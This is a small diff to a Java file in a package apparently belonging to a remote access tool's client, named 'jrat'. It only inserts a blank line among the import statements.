@@ -1,6 +1,7 @@
 package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
+
 import java.io.File;
 import java.io.FileOutputStream;
 import java.util.Random;
